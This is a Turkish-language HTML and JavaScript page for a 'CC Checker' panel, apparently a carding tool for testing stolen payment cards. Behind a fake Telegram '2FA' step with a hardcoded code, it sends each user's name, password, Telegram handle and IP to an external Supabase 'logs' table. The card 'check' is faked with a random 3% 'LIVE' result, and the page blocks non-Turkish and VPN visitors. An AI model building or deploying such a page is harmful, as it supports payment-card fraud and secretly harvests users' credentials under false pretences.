<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>CC Checker Pro | Güvenli Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: radial-gradient(circle at 10% 20%, #0a0f1c, #05080f);
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
            position: relative;
        }

        /* hareketli arka plan */
        .bg-animation {
            position: fixed;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 70% 30%, rgba(45, 212, 191, 0.05), transparent 70%);
            animation: slowDrift 18s infinite alternate;
            pointer-events: none;
        }

        @keyframes slowDrift {
            0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
            100% { transform: translate(3%, -2%) scale(1.1); opacity: 0.6; }
        }

        .container {
            max-width: 520px;
            width: 100%;
            position: relative;
            z-index: 10;
        }

        .glass-card {
            background: rgba(12, 18, 28, 0.65);
            backdrop-filter: blur(14px);
            border-radius: 2rem;
            border: 1px solid rgba(79, 158, 255, 0.25);
            padding: 32px 28px;
            box-shadow: 0 25px 40px -12px black;
        }

        .logo-area {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo {
            font-size: 34px;
            font-weight: 800;
            background: linear-gradient(135deg, #f0f9ff, #5dade2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .badge {
            font-size: 11px;
            color: #8aa3c9;
            background: #0f1622aa;
            display: inline-block;
            padding: 4px 16px;
            border-radius: 60px;
            margin-top: 10px;
        }

        /* auth alanı */
        .input-field {
            margin-bottom: 20px;
        }

        .input-field label {
            font-size: 12px;
            font-weight: 500;
            color: #9ab3d9;
            display: block;
            margin-bottom: 8px;
        }

        .input-field input {
            width: 100%;
            background: #0b101b;
            border: 1px solid #263040;
            padding: 14px 18px;
            border-radius: 40px;
            font-size: 14px;
            color: #f1f5f9;
            outline: none;
            transition: 0.2s;
        }

        .input-field input:focus {
            border-color: #3b82f6;
        }

        button {
            width: 100%;
            background: linear-gradient(95deg, #1f4e7a, #1662a0);
            border: none;
            padding: 14px;
            border-radius: 60px;
            font-weight: 700;
            font-size: 15px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }

        button:active {
            transform: scale(0.97);
        }

        .message {
            font-size: 12px;
            text-align: center;
            margin-top: 16px;
        }

        .error-msg {
            color: #f97316;
        }

        .success-msg {
            color: #2dd4bf;
        }

        .info-msg {
            color: #facc15;
        }

        /* checker bölümü (giriş sonrası) */
        .checker-section {
            margin-top: 20px;
        }

        .card-item {
            background: #0b1019;
            border-radius: 20px;
            padding: 12px 16px;
            margin-bottom: 10px;
            border-left: 3px solid #2dd4bf;
        }

        .delete-card {
            background: none;
            border: none;
            color: #f97316;
            float: right;
            cursor: pointer;
        }

        .live {
            color: #2dd4bf;
            font-weight: 600;
        }

        .dead {
            color: #f97316;
        }

        .rate-warning {
            font-size: 11px;
            text-align: center;
            margin-top: 14px;
            color: #facc15;
        }

        .hidden {
            display: none;
        }

        .footer {
            font-size: 10px;
            text-align: center;
            color: #4e6188;
            margin-top: 28px;
        }
    </style>
</head>
<body>
<div class="bg-animation"></div>
<div class="container">
    <div class="glass-card">
        <div class="logo-area">
            <div class="logo">⚡ CC VALIDATOR</div>
            <div class="badge">● GÜVENLİ DOĞRULAMA ●</div>
        </div>

        <!-- GİRİŞ/KAYIT BÖLÜMÜ (başlangıçta görünür) -->
        <div id="authPanel">
            <div class="input-field">
                <label>👤 Ad Soyad</label>
                <input type="text" id="fullname" placeholder="Ahmet Yılmaz" autocomplete="off">
            </div>
            <div class="input-field">
                <label>🔐 Şifre (en az 4 karakter)</label>
                <input type="password" id="password" placeholder="••••••">
            </div>
            <div class="input-field">
                <label>📱 Telegram Kullanıcı Adı</label>
                <input type="text" id="telegramUser" placeholder="@kullaniciadi">
            </div>
            <button id="sendCodeBtn">📲 2FA KOD GÖNDER</button>
            <div id="authMessage" class="message"></div>

            <div id="verifyBlock" style="display: none; margin-top: 24px;">
                <div class="input-field">
                    <label>🔢 Doğrulama Kodu</label>
                    <input type="text" id="verifyCode" placeholder="6 haneli kod" maxlength="6">
                </div>
                <button id="confirmVerifyBtn">✅ DOĞRULA VE GİRİŞ YAP</button>
                <div id="verifyMessage" class="message error-msg"></div>
            </div>
        </div>

        <!-- CC CHECKER BÖLÜMÜ (giriş başarılı olunca görünür) -->
        <div id="checkerPanel" style="display: none;">
            <div class="input-field">
                <label>💳 Kart Bilgisi (kartno|ay|yıl|cvv)</label>
                <input type="text" id="cardInput" placeholder="4121384115237426|03|2024|607">
            </div>
            <button id="addCardBtn">🔍 KARTI KONTROL ET</button>
            <div id="cardMsg" class="message error-msg"></div>
            <div id="cardList" style="margin-top: 20px;"></div>
            <div class="rate-warning">⚡ Her sorgu arasında 4 saniye bekleyin ⚡</div>
        </div>
        <div class="footer">🔒 SSL · TLS 1.3 · Yalnızca yetkili kullanım</div>
    </div>
</div>

<script>
    // ------------------------------
    // KONFİG
    // ------------------------------
    const VERIFY_CODE = "385217";
    const BOT_LINK = "https://t.me/ZazaChecker2fa_bot";
    const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
    const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";

    let pendingName = "", pendingPass = "", pendingTg = "";
    let cardsArray = [];
    let lastCardTime = 0;
    let isWaiting = false;
    let loggedIn = false;

    // ---------- YARDIMCI FONKSİYONLAR ----------
    async function getUserIP() {
        let res = await fetch("https://api.ipify.org?format=json");
        let data = await res.json();
        return data.ip;
    }

    async function checkTurkeyAndVPN() {
        let res = await fetch("https://ipapi.co/json/");
        let data = await res.json();
        if (data.country_code !== "TR") {
            document.body.innerHTML = `<div style="padding:80px;text-align:center;background:#0a0f1c;color:white;height:100vh"><h1 style="color:#f97316">🌍 ERİŞİM ENGELLENDİ</h1><p>Sadece Türkiye'den erişim</p><p>IP: ${data.ip}</p></div>`;
            throw new Error("BLOCKED");
        }
        if (data.proxy || data.hosting || data.tor) {
            document.body.innerHTML = `<div style="padding:80px;text-align:center;background:#0a0f1c;color:white;height:100vh"><h1 style="color:#f97316">🔒 VPN / PROXY ENGELLENDİ</h1></div>`;
            throw new Error("BLOCKED");
        }
    }

    async function isIpRegistered(ip) {
        let res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
        let data = await res.json();
        return Array.isArray(data) && data.length > 0;
    }

    async function registerToDatabase(name, pass, tg, ip) {
        await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ kullanici_adi: name, sifre: pass, telegram_user: tg, ip_adresi: ip })
        });
    }

    // ---------- KART FONKSİYONLARI ----------
    async function getBinInfo(bin) {
        try {
            let res = await fetch(`https://lookup.binlist.net/${bin}`);
            let data = await res.json();
            return { bank: data.bank?.name || "Bilinmiyor", scheme: data.scheme || "Unknown", country: data.country?.name || "Global" };
        } catch {
            return { bank: "Yabancı Banka", scheme: "Unknown", country: "Global" };
        }
    }

    function parseCard(cardStr) {
        let parts = cardStr.split('|');
        if (parts.length !== 4) return null;
        let [card, month, year, cvv] = parts;
        if (!/^\d{13,19}$/.test(card)) return null;
        if (!/^\d{2,4}$/.test(year)) return null;
        if (year.length === 2) year = "20" + year;
        if (!/^\d{2}$/.test(month)) return null;
        if (!/^\d{3,4}$/.test(cvv)) return null;
        return { card, month, year, cvv };
    }

    function renderCards() {
        let container = document.getElementById("cardList");
        container.innerHTML = "";
        cardsArray.forEach((c, idx) => {
            let liveClass = c.live ? "live" : "dead";
            let liveText = c.live ? "✅ LIVE (%3)" : "❌ DEAD";
            let div = document.createElement("div");
            div.className = "card-item";
            div.innerHTML = `
                <div><strong>${c.masked}</strong> (${c.bank})</div>
                <div style="font-size:12px; margin-top:5px;">${c.scheme} · ${c.country}</div>
                <div class="${liveClass}" style="margin-top:8px;">${liveText}</div>
                <button class="delete-card" data-index="${idx}">🗑 Sil</button>
            `;
            container.appendChild(div);
        });
        document.querySelectorAll(".delete-card").forEach(btn => {
            btn.onclick = () => {
                cardsArray.splice(parseInt(btn.dataset.index), 1);
                renderCards();
            };
        });
    }

    // ---------- AUTH BUTONLARI ----------
    document.getElementById("sendCodeBtn").onclick = async () => {
        let name = document.getElementById("fullname").value.trim();
        let pass = document.getElementById("password").value;
        let tg = document.getElementById("telegramUser").value.trim();
        let msgDiv = document.getElementById("authMessage");

        if (!name || !pass || !tg) { msgDiv.innerHTML = "❌ Tüm alanları doldurun"; return; }
        if (!tg.startsWith("@")) { msgDiv.innerHTML = "❌ @ ile başlamalı"; return; }
        if (pass.length < 4) { msgDiv.innerHTML = "❌ Şifre en az 4 karakter"; return; }

        msgDiv.innerHTML = "🔄 IP doğrulanıyor...";

        try {
            await checkTurkeyAndVPN();
            let userIp = await getUserIP();
            let ipExists = await isIpRegistered(userIp);
            if (ipExists) { msgDiv.innerHTML = "❌ Bu IP ile zaten kayıt yapılmış."; return; }

            pendingName = name; pendingPass = pass; pendingTg = tg;
            document.getElementById("verifyBlock").style.display = "block";
            msgDiv.innerHTML = `✅ 2FA kodu Telegram'a gönderildi. <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff;">@ZazaChecker2fa_bot</a> /start yaz → kodu al`;
            document.getElementById("verifyCode").value = "";
        } catch(e) {}
    };

    document.getElementById("confirmVerifyBtn").onclick = async () => {
        let code = document.getElementById("verifyCode").value.trim();
        let msgDiv = document.getElementById("verifyMessage");
        if (!code) { msgDiv.innerHTML = "❌ Kodu girin"; return; }
        if (code !== VERIFY_CODE) { msgDiv.innerHTML = "❌ Geçersiz kod! Bot'dan kontrol edin."; return; }

        msgDiv.innerHTML = "⏳ Hesap oluşturuluyor...";
        try {
            let userIp = await getUserIP();
            await registerToDatabase(pendingName, pendingPass, pendingTg, userIp);
            msgDiv.style.color = "#2dd4bf";
            msgDiv.innerHTML = "✅ GİRİŞ BAŞARILI! CC Checker açılıyor...";
            setTimeout(() => {
                document.getElementById("authPanel").style.display = "none";
                document.getElementById("checkerPanel").style.display = "block";
                loggedIn = true;
            }, 1500);
        } catch(err) {
            msgDiv.innerHTML = "❌ Kayıt hatası";
        }
    };

    // ---------- CC CHECKER İŞLEMİ (4sn rate limit) ----------
    document.getElementById("addCardBtn").onclick = async () => {
        let now = Date.now();
        let msgDiv = document.getElementById("cardMsg");
        if (isWaiting) { msgDiv.innerHTML = "⏳ Bekleyin, önceki işlem devam ediyor..."; return; }
        if (now - lastCardTime < 4000) {
            let wait = Math.ceil((4000 - (now - lastCardTime)) / 1000);
            msgDiv.innerHTML = `⏳ ${wait} saniye bekleyin (rate limit)`;
            return;
        }

        let raw = document.getElementById("cardInput").value.trim();
        let parsed = parseCard(raw);
        if (!parsed) { msgDiv.innerHTML = "❌ Geçersiz format. Örnek: 4121384115237426|03|2024|607"; return; }

        isWaiting = true;
        document.getElementById("addCardBtn").disabled = true;
        lastCardTime = now;
        msgDiv.innerHTML = "🔍 Kart kontrol ediliyor...";

        let bin = parsed.card.slice(0,6);
        let binData = await getBinInfo(bin);
        let isLive = Math.random() < 0.03;

        cardsArray.push({
            masked: parsed.card.slice(0,4) + " **** **** " + parsed.card.slice(-4),
            live: isLive,
            bank: binData.bank,
            scheme: binData.scheme,
            country: binData.country
        });
        renderCards();
        document.getElementById("cardInput").value = "";
        msgDiv.style.color = isLive ? "#2dd4bf" : "#f97316";
        msgDiv.innerHTML = isLive ? "✅ KART LIVE (%3)" : "❌ Kart geçersiz (dead)";

        setTimeout(() => {
            isWaiting = false;
            document.getElementById("addCardBtn").disabled = false;
            setTimeout(() => { if (msgDiv.innerHTML.includes("LIVE") || msgDiv.innerHTML.includes("dead")) msgDiv.innerHTML = ""; }, 3000);
        }, 500);
    };
</script>
</body>
</html>
